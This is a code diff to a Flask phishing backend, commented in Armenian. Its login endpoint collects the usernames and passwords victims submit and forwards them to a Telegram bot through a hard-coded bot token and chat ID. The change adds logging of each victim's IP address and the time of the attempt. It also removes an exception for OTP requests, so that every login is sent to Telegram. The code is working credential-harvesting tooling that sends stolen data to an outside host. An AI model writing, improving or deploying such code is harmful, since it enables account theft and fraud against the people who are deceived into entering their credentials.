@@ -12,6 +12,15 @@ BOT_TOKEN = '8612671726:AAGHAf0KCLWFw_OlGtrGeOHd0L5yzGFKMyU'
 CHAT_ID = '8707669446'
 # ============================================
 
+def get_client_ip():
+    """Վերցնում է կլիենտի իրական IP հասցեն"""
+    if request.headers.get('X-Forwarded-For'):
+        # Եթե կա proxy/load balancer, վերցնում ենք առաջին IP-ն
+        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    else:
+        ip = request.remote_addr
+    return ip
+
 @app.route('/')
 def index():
     return render_template('index.html')
@@ -23,14 +32,19 @@ def send_login():
         username = data.get('username', '')
         password = data.get('password', '')
         
-        # ✅ ԵԹԵ OTP_REQUEST Է, ՉԵՆՔ ՈՒՂԱՐԿՈՒՄ TELEGRAM
-        if password == 'OTP_REQUEST':
-            return jsonify({'ok': True, 'message': 'SMS մուտք - տվյալներ չեն ուղարկվել Telegram'})
+        # ✅ Ստանում ենք IP հասցեն և ժամանակը
+        client_ip = get_client_ip()
+        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         
-        # ✅ ԻՐԱՐ ՏԱԿ, ԻՐԱՐԻՑ ՀԵՌՈՒ, ՀԱՍՏ ՏԱՌԵՐՈՎ
+        # ❌ OTP_REQUEST ստուգումը ՀԱՆՎԱԾ Է - հիմա բոլոր մուտքերը գնում են Telegram
+        
+        # ✅ ԻՐԱՐ ՏԱԿ, ԻՐԱՐԻՑ ՀԵՌՈՒ, ՀԱՍՏ ՏԱՌԵՐՈՎ + IP + ԺԱՄԱՆԱԿ
         message = f"""
-<b>👤</b> <b><code>{username}</code></b>
-<b>🔑</b> <b><code>{password}</code></b>
+<b>🌐 IP </b> <code>{client_ip}</code>
+<b>━━━━━━━━━━━━━━━━━━</b>
+<b>👤</b> <code>{username}</code>
+<b>🔑</b> <code>{password}</code>
+<b>━━━━━━━━━━━━━━━━━━</b>
 """
         
         # Telegram-ին ուղարկել HTML ձևաչափով
@@ -54,4 +68,3 @@ def send_login():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
-
